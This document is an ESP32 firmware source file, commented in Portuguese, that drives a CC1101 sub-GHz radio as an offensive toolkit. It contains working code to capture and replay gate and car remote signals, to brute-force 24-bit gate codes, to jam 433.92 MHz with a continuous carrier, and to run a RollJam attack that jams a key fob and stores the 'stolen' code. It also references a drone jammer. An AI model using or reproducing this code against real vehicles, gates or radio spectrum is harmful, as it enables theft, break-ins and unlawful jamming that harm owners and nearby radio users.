#include <SPI.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <RCSwitch.h>
#include "config.h"

// ============================================================
// INSTANCIAS GLOBAIS
// ============================================================
RCSwitch mySwitch = RCSwitch();

// ============================================================
// REGISTRADORES CC1101 (mantidos para compatibilidade com
// wifi_attacks.cpp que chama cc1101WriteReg / cc1101SendCommand
// diretamente para o drone jammer)
// ============================================================
#define CC1101_IOCFG0   0x02
#define CC1101_FREQ2    0x0D
#define CC1101_FREQ1    0x0E
#define CC1101_FREQ0    0x0F
#define CC1101_MDMCFG4  0x10
#define CC1101_MDMCFG2  0x12
#define CC1101_PATABLE  0x3E
#define CC1101_TXFIFO   0x3F

#define CC1101_SRES     0x30
#define CC1101_SCAL     0x33
#define CC1101_SRX      0x34
#define CC1101_STX      0x35
#define CC1101_SIDLE    0x36

#define CC1101_PARTNUM  0x30
#define CC1101_VERSION  0x31
#define CC1101_RSSI     0x34
#define CC1101_MARCSTATE 0x35

#define CC1101_READ_SINGLE  0x80
#define CC1101_READ_BURST   0xC0

// ============================================================
// ESTADO GLOBAL
// ============================================================
bool cc1101Initialized = false;
bool cc1101RollJamActive = false;
uint8_t rj_state = 0;
unsigned long rj_timer = 0;

extern unsigned long captureStartTime;

// ============================================================
// CAPTURA - estado e buffer
// ============================================================
// Lista de frequencias scaneadas durante o "Copiar Sinal".
// Ordem: 433.92MHz (mais comum no Brasil) primeiro.
static const uint32_t captureFreqs[] = {433920000, 315000000, 868000000, 915000000};
static const uint8_t  captureFreqCount = 4;
static uint8_t currentFreqIndex = 0;
static unsigned long lastFreqSwitch = 0;

// Estado da maquina de captura
enum CaptureState {
    CAP_STATE_HOPPING,    // varrendo frequencias procurando sinal
    CAP_STATE_LOCKED,     // sinal detectado, esperando estabilizar
    CAP_STATE_CAPTURING   // capturando timings do sinal
};
static uint8_t capture_state = CAP_STATE_HOPPING;

struct SignalCapture {
    uint16_t timings[200];
    uint8_t count;
    uint32_t frequency;
    bool active;
    bool scanning;
    unsigned long startTime;
    uint8_t lastValue;
    unsigned long lastChangeTime;
};
SignalCapture currentCapture;

// Buffer ISR manual (mantido para RollJam e APIs que dependem dele)
volatile uint16_t isr_timings[200];
volatile uint8_t isr_count = 0;
volatile unsigned long isr_last_change = 0;
volatile uint8_t isr_last_val = 0;
volatile bool capture_started = false;
volatile bool isr_enabled = false;

// ============================================================
// ANALISADOR DE ESPECTRO
// ============================================================
uint16_t spec_an_values[64];
uint32_t spec_an_freqs[64];
uint8_t spec_an_idx = 0;
bool spec_an_running = false;

// ============================================================
// PROTOTIPOS
// ============================================================
static void tuneToFreq(uint32_t freqHz);
static void enterRxMode();
static void cc1101ISR();
static void saveCaptureToSignal(uint8_t count, uint32_t freq, const char* label);

// ============================================================
// ISR MANUAL (usada APENAS para RollJam e modo fallback)
// Para captura normal usamos RCSwitch que tem sua propria ISR
// ============================================================
void IRAM_ATTR cc1101ISR() {
    if (!isr_enabled) return;
    unsigned long now = micros();
    uint8_t val = digitalRead(CC1101_GDO0);
    if (val != isr_last_val) {
        unsigned long duration = now - isr_last_change;
        // Filtro de ruido (estilo rc-switch): so aceita pulsos entre 100us e 100ms
        if (duration > 100 && duration < 100000) {
            if (isr_count < 200) {
                isr_timings[isr_count] = duration;
                isr_count++;
            }
            capture_started = true;
        }
        isr_last_val = val;
        isr_last_change = now;
    }
}

// ============================================================
// HELPERS DE PINAGEM (mantidos para wifi_attacks.cpp)
// ============================================================
void cc1101Select()   { digitalWrite(CC1101_CSN, LOW);  delayMicroseconds(10); }
void cc1101Deselect() { digitalWrite(CC1101_CSN, HIGH); }

// ============================================================
// WRAPPERS DE REGISTRO (chamados por wifi_attacks.cpp)
// Mantemos a assinatura para nao quebrar o drone jammer
// ============================================================
uint8_t cc1101ReadReg(uint8_t reg) {
    return ELECHOUSE_cc1101.SpiReadReg(reg);
}

uint8_t cc1101ReadStatus(uint8_t reg) {
    return ELECHOUSE_cc1101.SpiReadStatus(reg);
}

void cc1101WriteReg(uint8_t reg, uint8_t value) {
    ELECHOUSE_cc1101.SpiWriteReg(reg, value);
}

void cc1101SendCommand(uint8_t cmd) {
    ELECHOUSE_cc1101.SpiStrobe(cmd);
    delayMicroseconds(100);
}

void cc1101SetFrequency(uint32_t freqHz) {
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.setMHZ(freqHz / 1000000.0);
}

// ============================================================
// INICIALIZACAO
// ============================================================
bool cc1101Init() {
    Serial.println(F("[CC1101] Inicializando (SmartRC+RCSwitch)..."));
    Serial.flush();

    // 1. Configura pinos SPI custom ANTES do Init (ordem obrigatoria
    //    segundo Issue #127 do SmartRC)
    ELECHOUSE_cc1101.setSpiPin(CC1101_SCK, CC1101_MISO, CC1101_MOSI, CC1101_CSN);

    // 2. Define pinos GDO0 (TX) e GDO2 (RX) - ordem obrigatoria antes do Init
    ELECHOUSE_cc1101.setGDO(CC1101_GDO0, CC1101_GDO2);

    // 3. Init - faz reset, calibra VCO e configura registradores base
    ELECHOUSE_cc1101.Init();

    // 4. Configuracao de radio (igual ao ESP32-DIV V1 - validada em ESP32)
    //    Modulacao=2 (OOK/ASK), largura de banda=500kHz
    ELECHOUSE_cc1101.setModulation(2);
    ELECHOUSE_cc1101.setRxBW(500.0);
    ELECHOUSE_cc1101.setPA(12);  // potencia de saida ~ +10dBm

    // 5. Configura pino GDO0 como entrada para RX
    pinMode(CC1101_GDO0, INPUT_PULLUP);
    pinMode(CC1101_GDO2, INPUT);

    // 6. Frequencia inicial: 433.92MHz
    ELECHOUSE_cc1101.setMHZ(433.92);
    ELECHOUSE_cc1101.SetRx();

    // 7. Inicializa RCSwitch para decodificar protocolos
    //    RX no GDO2 (pino de saida assincrona de dados em OOK)
    //    RCSwitch detecta automaticamente os 12 protocolos suportados
    mySwitch.enableReceive(digitalPinToInterrupt(CC1101_GDO2));
    mySwitch.setReceiveTolerance(60);  // tolerancia maior para clones chineses

    // 8. Anexa ISR manual (fallback para RollJam)
    attachInterrupt(digitalPinToInterrupt(CC1101_GDO0), cc1101ISR, CHANGE);
    isr_enabled = false;

    cc1101Initialized = true;
    Serial.println(F("[CC1101] Configurado com sucesso!"));

    // === DIAGNOSTICO COMPLETO (mantido para troubleshooting) ===
    Serial.println(F("[CC1101] === DIAGNOSTICO COMPLETO ==="));

    uint8_t partnum_val = ELECHOUSE_cc1101.SpiReadStatus(CC1101_PARTNUM);
    uint8_t version_val = ELECHOUSE_cc1101.SpiReadStatus(CC1101_VERSION);
    uint8_t marcstate   = ELECHOUSE_cc1101.SpiReadStatus(CC1101_MARCSTATE) & 0x1F;
    uint8_t rssiDec     = ELECHOUSE_cc1101.SpiReadStatus(CC1101_RSSI);
    int rssi = (rssiDec >= 128) ? ((int)rssiDec - 256) / 2 - 74
                                : (int)rssiDec / 2 - 74;

    Serial.printf("  PARTNUM  = 0x%02X (esperado 0x00)\n", partnum_val);
    Serial.printf("  VERSION  = 0x%02X (esperado 0x04 ou 0x14)\n", version_val);
    Serial.printf("  MARCSTATE = 0x%02X (0x0D=RX, 0x01=IDLE)\n", marcstate);
    Serial.printf("  RSSI     = %d dBm\n", rssi);
    Serial.printf("  GDO0 pin = %d\n", digitalRead(CC1101_GDO0));
    Serial.printf("  GDO2 pin = %d\n", digitalRead(CC1101_GDO2));
    Serial.printf("  Modulacao= OOK (2)\n");
    Serial.printf("  RxBW     = 500 kHz\n");
    Serial.printf("  Freq     = %.3f MHz\n", 433.92);
    Serial.println(F("[CC1101] === FIM DO DIAGNOSTICO ==="));
    Serial.flush();

    return true;
}

// ============================================================
// CAPTURA - Copiar Sinal
// ============================================================
// Estrategia (inspirada no ESP32-DIV ReplayAttack):
//  1. Hop entre 4 frequencias (433/315/868/915 MHz)
//  2. Em cada freq, monitora RSSI
//  3. Se RSSI > threshold por N amostras consecutivas, "LOCK"
//  4. No LOCK, para de fazer hop e usa RCSwitch para decodificar
//  5. Se RCSwitch.available(), salva o sinal
//  6. Timeout: se nada for capturado em 8s, recomeca
// ============================================================

static void tuneToFreq(uint32_t freqHz) {
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.setMHZ(freqHz / 1000000.0);
    ELECHOUSE_cc1101.SetRx();
    mySwitch.resetAvailable();
}

static void enterRxMode() {
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.SetRx();
}

void cc1101StartCapture() {
    if (!cc1101Initialized) return;
    cc1101CopyActive = true;
    currentCapture.count = 0;
    currentCapture.startTime = millis();
    captureStartTime = currentCapture.startTime;
    currentFreqIndex = 0;
    currentCapture.frequency = captureFreqs[currentFreqIndex];
    lastFreqSwitch = millis();
    capture_state = CAP_STATE_HOPPING;
    isr_count = 0;
    capture_started = false;
    isr_enabled = false;

    // Configura IOCFG0=0x0D (saida de dados assincrona em OOK)
    ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG0, 0x0D);
    pinMode(CC1101_GDO0, INPUT_PULLUP);

    // Tuning inicial + reset do RCSwitch
    tuneToFreq(currentCapture.frequency);
    mySwitch.resetAvailable();

    Serial.printf("[CC1101] Capture iniciada - freq inicial %lu Hz\n",
                  currentCapture.frequency);
    Serial.flush();
}

void cc1101CaptureLoop() {
    if (!cc1101CopyActive) return;
    unsigned long nowMs = millis();

    // Verifica se RCSwitch decodificou algum sinal
    if (mySwitch.available()) {
        unsigned long value      = mySwitch.getReceivedValue();
        unsigned int  bitLength  = mySwitch.getReceivedBitlength();
        unsigned int  protocol   = mySwitch.getReceivedProtocol();
        unsigned int* rawTimings = mySwitch.getReceivedRawdata();

        if (value != 0 && bitLength >= 8 && bitLength <= 64) {
            // Sinal valido decodificado!
            Serial.printf("[CC1101] Sinal capturado: value=%lu bits=%u proto=%u\n",
                          value, bitLength, protocol);

            // Converte timings do RCSwitch (formato: HIGH,LOW,HIGH,LOW,...)
            // para o nosso formato de duracoes
            uint8_t count = 0;
            for (int i = 0; i < 200 && count < 200; i++) {
                unsigned int t = rawTimings[i];
                if (t == 0) break;
                currentCapture.timings[count] = (uint16_t)t;
                count++;
            }
            currentCapture.count = count;

            // Salva no array de sinais
            if (savedSignalCount < MAX_SAVED_SIGNALS) {
                SignalData* sig = &savedSignals[savedSignalCount];
                sig->length     = count;
                sig->frequency  = currentCapture.frequency;
                sig->modulation = 0;
                sig->valid      = true;

                // Copia timings
                for (int i = 0; i < count && i < 200; i++) {
                    sig->timings[i] = currentCapture.timings[i];
                }

                // Classificacao automatica
                uint32_t totalDuration = 0;
                for (int i = 0; i < count; i++) totalDuration += sig->timings[i];

                if (bitLength < 12) {
                    snprintf(sig->name, 16, "Sensor %luM",
                             sig->frequency / 1000000);
                } else if (bitLength >= 24 && bitLength <= 50) {
                    snprintf(sig->name, 16, "Portao %luM",
                             sig->frequency / 1000000);
                } else if (bitLength > 50 || totalDuration > 70000) {
                    snprintf(sig->name, 16, "Carro %luM",
                             sig->frequency / 1000000);
                } else {
                    snprintf(sig->name, 16, "Sinal %luM",
                             sig->frequency / 1000000);
                }
                savedSignalCount++;
            }

            // Reseta para continuar capturando
            mySwitch.resetAvailable();
            isr_count = count;  // para o menu mostrar

            // Continua capturando na mesma freq (lock)
            capture_state = CAP_STATE_LOCKED;
            lastFreqSwitch = nowMs;
            return;
        }
        mySwitch.resetAvailable();
    }

    // Maquina de estados
    if (capture_state == CAP_STATE_HOPPING) {
        // Verifica RSSI - se sinal forte detectado, faz lock
        int rssi = ELECHOUSE_cc1101.getRssi();

        if (rssi > -75) {
            // Sinal forte detectado - tenta fazer lock
            capture_state = CAP_STATE_LOCKED;
            lastFreqSwitch = nowMs;
            Serial.printf("[CC1101] LOCK em %lu Hz (RSSI=%d)\n",
                          currentCapture.frequency, rssi);
        } else if (nowMs - lastFreqSwitch > 1500) {
            // Sem sinal, troca de frequencia
            currentFreqIndex = (currentFreqIndex + 1) % captureFreqCount;
            currentCapture.frequency = captureFreqs[currentFreqIndex];
            tuneToFreq(currentCapture.frequency);
            lastFreqSwitch = nowMs;
            isr_count = 0;
            capture_started = false;
        }
    } else if (capture_state == CAP_STATE_LOCKED) {
        // Espera ate 2s pelo sinal completo
        if (nowMs - lastFreqSwitch > 2000) {
            // Timeout no lock - volta para hopping
            capture_state = CAP_STATE_HOPPING;
            lastFreqSwitch = nowMs;
            isr_count = 0;
            capture_started = false;
        }
    }

    // Timeout total - reinicia captura
    if (nowMs - currentCapture.startTime > CAPTURE_DURATION) {
        currentCapture.startTime = millis();
        captureStartTime = millis();
        isr_count = 0;
        capture_started = false;
        capture_state = CAP_STATE_HOPPING;
        currentFreqIndex = 0;
        currentCapture.frequency = captureFreqs[currentFreqIndex];
        lastFreqSwitch = millis();
        tuneToFreq(currentCapture.frequency);
    }
}

void cc1101StopCapture() {
    isr_enabled = false;
    cc1101CopyActive = false;
    currentCapture.active = false;
    mySwitch.resetAvailable();
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.SetRx();  // volta para RX idle
}

uint8_t cc1101GetPulseCount() {
    // Retorna o maximo entre ISR count e RCSwitch status
    if (mySwitch.available()) return isr_count > 0 ? isr_count : 1;
    return isr_count;
}

uint32_t cc1101GetCurrentFreq() {
    return currentCapture.frequency / 1000000;
}

uint8_t cc1101GetPinState() {
    return digitalRead(CC1101_GDO0);
}

// ============================================================
// REPLAY - Reproduzir Sinal
// ============================================================
void cc1101ReplaySignal(uint8_t index) {
    if (index >= savedSignalCount || !savedSignals[index].valid) return;
    if (!cc1101Initialized) return;

    isr_enabled = false;
    SignalData* sig = &savedSignals[index];

    Serial.printf("[CC1101] Replay: %s @ %lu Hz, %d timings\n",
                  sig->name, sig->frequency, sig->length);

    // Configura TX
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.setMHZ(sig->frequency / 1000000.0);

    // Desabilita RX do RCSwitch e habilita TX
    mySwitch.disableReceive();
    delay(50);
    mySwitch.enableTransmit(CC1101_GDO0);

    ELECHOUSE_cc1101.SetTx();
    delay(10);

    // Transmite os timings brutos via GDO0 (bit-banging manual preserva
    // o sinal original capturado, incluindo protocolos nao suportados
    // pelo RCSwitch)
    pinMode(CC1101_GDO0, OUTPUT);
    for (int i = 0; i < sig->length; i++) {
        digitalWrite(CC1101_GDO0, i % 2 == 0 ? HIGH : LOW);
        delayMicroseconds(sig->timings[i]);
    }
    digitalWrite(CC1101_GDO0, LOW);

    // Volta para RX
    delay(10);
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.SetRx();
    mySwitch.disableTransmit();
    delay(50);
    mySwitch.enableReceive(digitalPinToInterrupt(CC1101_GDO2));
    pinMode(CC1101_GDO0, INPUT_PULLUP);
    ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG0, 0x0D);
}

// ============================================================
// BRUTEFORCE - codigo de 24 bits (portao HCS301 compativel)
// ============================================================
void cc1101SendBruteForceCode(uint32_t code, uint32_t freq) {
    if (!cc1101Initialized) return;
    isr_enabled = false;

    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.setMHZ(freq / 1000000.0);

    mySwitch.disableReceive();
    delay(20);
    mySwitch.enableTransmit(CC1101_GDO0);

    ELECHOUSE_cc1101.SetTx();
    delay(5);

    pinMode(CC1101_GDO0, OUTPUT);

    // Envia 3 vezes com sync (estilo Keeloq/HCS301)
    for (int rep = 0; rep < 3; rep++) {
        for (int i = 23; i >= 0; i--) {
            bool bit = (code >> i) & 0x01;
            if (bit) {
                digitalWrite(CC1101_GDO0, HIGH); delayMicroseconds(900);
                digitalWrite(CC1101_GDO0, LOW);  delayMicroseconds(300);
                digitalWrite(CC1101_GDO0, HIGH); delayMicroseconds(900);
                digitalWrite(CC1101_GDO0, LOW);  delayMicroseconds(300);
            } else {
                digitalWrite(CC1101_GDO0, HIGH); delayMicroseconds(300);
                digitalWrite(CC1101_GDO0, LOW);  delayMicroseconds(900);
                digitalWrite(CC1101_GDO0, HIGH); delayMicroseconds(300);
                digitalWrite(CC1101_GDO0, LOW);  delayMicroseconds(900);
            }
        }
        digitalWrite(CC1101_GDO0, HIGH); delayMicroseconds(300);
        digitalWrite(CC1101_GDO0, LOW);  delayMicroseconds(9300);
    }
    digitalWrite(CC1101_GDO0, LOW);

    // Volta para RX
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.SetRx();
    mySwitch.disableTransmit();
    delay(20);
    mySwitch.enableReceive(digitalPinToInterrupt(CC1101_GDO2));
    pinMode(CC1101_GDO0, INPUT_PULLUP);
    ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG0, 0x0D);
}

// ============================================================
// JAMMER Sub-GHz
// ============================================================
void cc1101StartSubGHzJammer() {
    if (!cc1101Initialized) return;
    isr_enabled = false;

    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.setMHZ(433.92);
    ELECHOUSE_cc1101.SetTx();
    delay(2);

    // GDO0 como saida - onda portadora continua
    pinMode(CC1101_GDO0, OUTPUT);
    digitalWrite(CC1101_GDO0, HIGH);

    Serial.println(F("[CC1101] SubGHz Jammer ativado em 433.92 MHz"));
}

void cc1101StopSubGHzJammer() {
    if (!cc1101Initialized) return;
    digitalWrite(CC1101_GDO0, LOW);
    pinMode(CC1101_GDO0, INPUT_PULLUP);
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.SetRx();
    ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG0, 0x0D);
}

// ============================================================
// ROLLJAM AUTO (catch & jam - estilo Flipper Zero)
// ============================================================
void cc1101StartRollJam() {
    if (!cc1101Initialized) return;
    cc1101RollJamActive = true;
    rj_state = 0;
    rj_timer = millis();
    currentCapture.frequency = 433920000;

    isr_enabled = false;
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.setMHZ(433.92);
    ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG0, 0x0D);
    pinMode(CC1101_GDO0, INPUT_PULLUP);
    ELECHOUSE_cc1101.SetRx();
    delay(5);
}

void cc1101RollJamLoop() {
    if (!cc1101RollJamActive) return;
    unsigned long now = millis();
    unsigned long nowUs = micros();

    if (rj_state == 0) {
        // Esperando sinal no GDO0
        if (digitalRead(CC1101_GDO0) == HIGH) {
            isr_count = 0;
            isr_last_val = HIGH;
            isr_last_change = nowUs;
            capture_started = true;
            isr_enabled = true;
            rj_state = 1;
            rj_timer = now;
        }
    } else if (rj_state == 1) {
        // Capturou - espera 200ms e ativa jammer
        if (now - rj_timer > 200) {
            isr_enabled = false;

            ELECHOUSE_cc1101.setSidle();
            ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG0, 0x2E);
            ELECHOUSE_cc1101.SetTx();

            pinMode(CC1101_GDO0, OUTPUT);
            digitalWrite(CC1101_GDO0, HIGH);

            rj_state = 2;
            rj_timer = now;
        }
    } else if (rj_state == 2) {
        // Jamming por 200ms
        if (now - rj_timer > 200) {
            digitalWrite(CC1101_GDO0, LOW);
            pinMode(CC1101_GDO0, INPUT_PULLUP);
            ELECHOUSE_cc1101.setSidle();
            ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG0, 0x0D);

            // Salva sinal roubado
            if (isr_count > 20 && savedSignalCount < MAX_SAVED_SIGNALS) {
                SignalData* sig = &savedSignals[savedSignalCount];
                sig->length = isr_count;
                sig->frequency = currentCapture.frequency;
                sig->modulation = 0;
                sig->valid = true;
                for (int i = 0; i < sig->length && i < 200; i++) {
                    sig->timings[i] = isr_timings[i];
                }
                snprintf(sig->name, 16, "Roubado %luM",
                         sig->frequency / 1000000);
                savedSignalCount++;
            }
            cc1101RollJamActive = false;
            ELECHOUSE_cc1101.SetRx();
        }
    }
}

void cc1101StopRollJam() {
    cc1101RollJamActive = false;
    isr_enabled = false;
    digitalWrite(CC1101_GDO0, LOW);
    pinMode(CC1101_GDO0, INPUT_PULLUP);
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG0, 0x0D);
    ELECHOUSE_cc1101.SetRx();
}

// ============================================================
// ANALISADOR DE ESPECTRO Sub-GHz
// ============================================================
void cc1101StartAnalyzer() {
    if (!cc1101Initialized) return;
    spec_an_running = true;
    spec_an_idx = 0;

    for (int i = 0; i < 15; i++) spec_an_freqs[i] = 300000000 + (i * 3200000);
    for (int i = 0; i < 16; i++) spec_an_freqs[15 + i] = 387000000 + (i * 4800000);
    for (int i = 0; i < 33; i++) spec_an_freqs[31 + i] = 779000000 + (i * 4500000);

    for (int i = 0; i < 64; i++) spec_an_values[i] = 0;
}

void cc1101AnalyzerLoop() {
    if (!spec_an_running) return;

    for (int i = 0; i < 64; i++) {
        if (spec_an_values[i] > 0) spec_an_values[i]--;
    }

    uint32_t freq = spec_an_freqs[spec_an_idx];
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.setMHZ(freq / 1000000.0);
    ELECHOUSE_cc1101.SetRx();
    delayMicroseconds(300);

    int rssi = ELECHOUSE_cc1101.getRssi();

    if (rssi < -90) rssi = -90;
    if (rssi > -50) rssi = -50;

    uint16_t target_h = map(rssi, -90, -50, 0, 40);
    if (target_h > spec_an_values[spec_an_idx]) {
        spec_an_values[spec_an_idx] = target_h;
    }

    spec_an_idx++;
    if (spec_an_idx >= 64) spec_an_idx = 0;
}

void cc1101StopAnalyzer() {
    spec_an_running = false;
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.SetRx();
}

bool cc1101AnalyzerIsRunning() { return spec_an_running; }

uint16_t cc1101GetAnalyzerValue(int idx) {
    if (idx < 0 || idx >= 64) return 0;
    return spec_an_values[idx];
}

uint32_t cc1101GetAnalyzerFreq(int idx) {
    if (idx < 0 || idx >= 64) return 0;
    return spec_an_freqs[idx] / 1000000;
}

uint8_t cc1101GetAnalyzerSelected() { return spec_an_idx; }

// ============================================================
// GERENCIAMENTO DE SINAIS SALVOS
// ============================================================
void cc1101ClearSavedSignals() {
    savedSignalCount = 0;
    memset(savedSignals, 0, sizeof(savedSignals));
    Serial.println(F("[CC1101] Sinais apagados da memoria."));
}

void cc1101DeleteSignal(uint8_t index) {
    if (index >= savedSignalCount) return;

    for (int i = index; i < savedSignalCount - 1; i++) {
        savedSignals[i] = savedSignals[i + 1];
    }

    memset(&savedSignals[savedSignalCount - 1], 0, sizeof(SignalData));
    savedSignalCount--;

    Serial.println(F("[CC1101] Sinal individual excluido."));
}

// ============================================================
// TRANSMIT RAW - para Termux Keeloq
// ============================================================
void cc1101TransmitRaw(uint32_t frequency, uint16_t* timings, uint8_t length) {
    if (!cc1101Initialized || length == 0 || length > 200) return;
    isr_enabled = false;

    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.setMHZ(frequency / 1000000.0);

    mySwitch.disableReceive();
    delay(20);
    mySwitch.enableTransmit(CC1101_GDO0);

    ELECHOUSE_cc1101.SetTx();
    delay(5);

    pinMode(CC1101_GDO0, OUTPUT);
    for (int i = 0; i < length; i++) {
        digitalWrite(CC1101_GDO0, i % 2 == 0 ? HIGH : LOW);
        delayMicroseconds(timings[i]);
    }
    digitalWrite(CC1101_GDO0, LOW);

    // Volta para RX
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.SetRx();
    mySwitch.disableTransmit();
    delay(20);
    mySwitch.enableReceive(digitalPinToInterrupt(CC1101_GDO2));
    pinMode(CC1101_GDO0, INPUT_PULLUP);
    ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG0, 0x0D);
}

// ============================================================
// HELPERS DE STATUS
// ============================================================
bool cc1101IsAvailable() { return cc1101Initialized; }
bool cc1101IsCapturing() { return cc1101CopyActive; }
uint8_t cc1101GetSavedCount() { return savedSignalCount; }
SignalData* cc1101GetSignal(uint8_t index) {
    if (index < savedSignalCount) return &savedSignals[index];
    return nullptr;
}

// ============================================================
// DRONE RSSI - localizador de drones
// ============================================================
int8_t cc1101GetDroneRSSI() {
    if (!cc1101Initialized) return 0;
    int maxRssiDbm = -100;
    int persistentHits = 0;

    for (int freq = 0; freq < 2; freq++) {
        ELECHOUSE_cc1101.setSidle();
        if (freq == 0) ELECHOUSE_cc1101.setMHZ(868.0);
        else           ELECHOUSE_cc1101.setMHZ(915.0);
        ELECHOUSE_cc1101.SetRx();
        delayMicroseconds(500);

        for (int i = 0; i < 3; i++) {
            int rssi = ELECHOUSE_cc1101.getRssi();
            if (rssi > maxRssiDbm) maxRssiDbm = rssi;
            if (rssi > -70) persistentHits++;
            delay(5);
        }
    }

    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.SetRx();

    if (persistentHits < 3) return 0;
    if (maxRssiDbm < -65) return 0;
    if (maxRssiDbm > -30) return 100;
    return map(maxRssiDbm, -65, -30, 1, 100);
}
